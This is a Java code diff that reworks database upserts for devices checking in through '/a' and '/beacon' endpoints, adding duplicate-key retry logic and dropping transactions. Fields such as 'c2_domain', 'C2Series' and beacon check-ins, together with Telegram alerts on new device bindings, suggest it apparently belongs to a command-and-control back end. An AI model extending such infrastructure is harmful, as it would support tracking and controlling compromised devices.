@@ -117,9 +117,9 @@ public class DeviceAsyncWriter {
 	 * 从 /a 接口异步绑定或插入设备。
 	 * <p>channelcode：仅当为空时按请求域名查 {@code qudao.c2_domain} 兜底；
 	 * 已有非空渠道不覆盖（/register 写入的渠道不受影响）。
+	 * <p>不加类级事务：并发 INSERT 冲突后需能立刻重查已提交行；失败事务会 rollback-only 导致「冲突后未命中」。
 	 */
 	@Async("databaseOperateStreamPush")
-	@Transactional
 	public void bindOrInsertFromA(String lhu, String domain, String clientIp, String model, String deviceName,
 			String iosVersion, String buildVersion, String hostname, String sysname, String release,
 			String kernelVersion, String source) {
@@ -151,31 +151,54 @@ public class DeviceAsyncWriter {
 				int temp = deviceDao.updateById(existing);
 				log.debug("设备绑定状态更新成功 lhu={} ip={} channelFilled={} wasBound={}",
 						lhu, clientIp, filledChannel, wasBound);
-				// 仅首次绑定通知；/beacon 补绑已发过则 /a 不再重复
 				if (temp > 0 && !wasBound) {
 					deviceTelegramService.notifyBindingByDeviceIdAsync(existing);
 				}
-			} else {
-				// 未命中：INSERT；渠道优先域名兜底，查不到则空（等后续 register / beacon 再补）
-				DeviceEntity newDevice = new DeviceEntity();
-				newDevice.setDeviceId(lhu);
-				newDevice.setDevice_id(lhu);
-				newDevice.setChannelCode("");
-				newDevice.setDomain(domain == null ? "" : domain);
-				newDevice.setIp(clientIp);
-				newDevice.setAddtime(now);
-				newDevice.setIpstatus(0);
-				newDevice.setDevicestatus(1);
-				newDevice.setOnlinestatus(1);
-				newDevice.setBindPhase(1);
-				newDevice.setLastEventAt(now);
-				newDevice.setModel(model == null ? "" : model);
-				newDevice.setDeviceName(deviceName == null ? "" : deviceName);
-				newDevice.setIosVersion(iosVersion == null ? "" : iosVersion);
-				newDevice.setC2Series(1);
-				fillChannelIfBlank(newDevice, domain);
+				return;
+			}
+
+			DeviceEntity newDevice = new DeviceEntity();
+			newDevice.setDeviceId(lhu);
+			newDevice.setDevice_id(lhu);
+			newDevice.setChannelCode("");
+			newDevice.setDomain(domain == null ? "" : domain);
+			newDevice.setIp(clientIp);
+			newDevice.setAddtime(now);
+			newDevice.setIpstatus(0);
+			newDevice.setDevicestatus(1);
+			newDevice.setOnlinestatus(1);
+			newDevice.setBindPhase(1);
+			newDevice.setLastEventAt(now);
+			newDevice.setModel(model == null ? "" : model);
+			newDevice.setDeviceName(deviceName == null ? "" : deviceName);
+			newDevice.setIosVersion(iosVersion == null ? "" : iosVersion);
+			newDevice.setC2Series(1);
+			fillChannelIfBlank(newDevice, domain);
+			try {
 				deviceDao.insert(newDevice);
 				log.info("设备新增成功 lhu={} ip={} channel={}", lhu, clientIp, newDevice.getChannelCode());
+			} catch (org.springframework.dao.DuplicateKeyException dup) {
+				DeviceEntity raced = waitFindDevice(lhu);
+				if (raced == null) {
+					log.info("/a 设备绑定冲突后未命中 lhu={} ip={}", lhu, clientIp);
+					return;
+				}
+				if (model != null && !model.isEmpty())
+					raced.setModel(model);
+				if (deviceName != null && !deviceName.isEmpty())
+					raced.setDeviceName(deviceName);
+				if (iosVersion != null && !iosVersion.isEmpty())
+					raced.setIosVersion(iosVersion);
+				raced.setIp(clientIp);
+				raced.setBindPhase(1);
+				raced.setDevicestatus(1);
+				raced.setOnlinestatus(1);
+				raced.setLastEventAt(now);
+				raced.setC2Series(1);
+				syncDeviceIdColumns(raced, lhu);
+				fillChannelIfBlank(raced, domain);
+				deviceDao.updateById(raced);
+				log.info("设备新增冲突转更新 lhu={} ip={}", lhu, clientIp);
 			}
 		} catch (Exception e) {
 			log.info("/a 设备绑定失败 lhu={} ip={} err={}", lhu, clientIp, e.toString(), e);
@@ -211,9 +234,9 @@ public class DeviceAsyncWriter {
 	 * /beacon 设备 upsert（三分支：新增 / 更新在线状态 / 补绑触发 Telegram）。
 	 * 已绑定设备按 {@link #beaconDeviceUpdateIntervalSec} 限流 UPDATE；不写 ios18param。
 	 * <p>channelcode 为空时按域名查 qudao 兜底；已有渠道不覆盖。
+	 * <p>不加事务：并发建机 DuplicateKey 后需重查已提交行，避免 rollback-only / 冲突后未命中。
 	 */
 	@Async("databaseOperateStreamPush")
-	@Transactional
 	public void beaconAddDevice(String uuid, String domain, String clientIp, DeaconBody request) {
 		if (uuid == null || uuid.isEmpty()) {
 			return;
@@ -245,6 +268,22 @@ public class DeviceAsyncWriter {
 				deviceDao.insert(newDevice);
 				log.info("/beacon 设备新增成功 uuid={} ip={} channel={}",
 						uuid, clientIp, newDevice.getChannelCode());
+			} catch (org.springframework.dao.DuplicateKeyException e) {
+				DeviceEntity raced = waitFindDevice(uuid);
+				if (raced != null) {
+					raced.setOnlinestatus(1);
+					raced.setBindPhase(1);
+					raced.setDevicestatus(1);
+					raced.setLastEventAt(now);
+					raced.setC2Series(1);
+					raced.setIp(clientIp);
+					syncDeviceIdColumns(raced, uuid);
+					fillChannelIfBlank(raced, domain);
+					deviceDao.updateById(raced);
+					log.info("/beacon 设备新增冲突转更新 uuid={} ip={}", uuid, clientIp);
+				} else {
+					log.info("/beacon 设备新增冲突后未命中 uuid={} ip={}", uuid, clientIp);
+				}
 			} catch (Exception e) {
 				log.info("/beacon 设备新增失败 uuid={} ip={} err={}", uuid, clientIp, e.toString());
 			}
@@ -316,6 +355,37 @@ public class DeviceAsyncWriter {
 	}
 
 	/**
+	 * 并发 INSERT 赢家可能尚未提交：短等待重查。
+	 */
+	private DeviceEntity waitFindDevice(String uuid) {
+		for (int i = 0; i < 8; i++) {
+			DeviceEntity d = deviceDao.findByDeviceId(uuid);
+			if (d != null) {
+				return d;
+			}
+			try {
+				Thread.sleep(15L * (i + 1));
+			} catch (InterruptedException ie) {
+				Thread.currentThread().interrupt();
+				return null;
+			}
+		}
+		return deviceDao.findByDeviceId(uuid);
+	}
+
+	private static void syncDeviceIdColumns(DeviceEntity d, String uuid) {
+		if (d == null || uuid == null) {
+			return;
+		}
+		if (DomainMatchUtil.isBlank(d.getDeviceId())) {
+			d.setDeviceId(uuid);
+		}
+		if (DomainMatchUtil.isBlank(d.getDevice_id())) {
+			d.setDevice_id(uuid);
+		}
+	}
+
+	/**
 	 * 仅当 device.channelcode 为空时，按域名查 qudao.c2_domain 写入。
 	 * @return true 表示本次写入了渠道
 	 */
@@ -323,9 +393,9 @@ public class DeviceAsyncWriter {
 		if (device == null || !DomainMatchUtil.isBlank(device.getChannelCode())) {
 			return false;
 		}
-		String host = DomainMatchUtil.normalizeHost(domainRaw);
+		String host = DomainMatchUtil.normalizeHostKeepPort(domainRaw);
 		if (host.isEmpty() && !DomainMatchUtil.isBlank(device.getDomain())) {
-			host = DomainMatchUtil.normalizeHost(device.getDomain());
+			host = DomainMatchUtil.normalizeHostKeepPort(device.getDomain());
 		}
 		if (host.isEmpty()) {
 			return false;
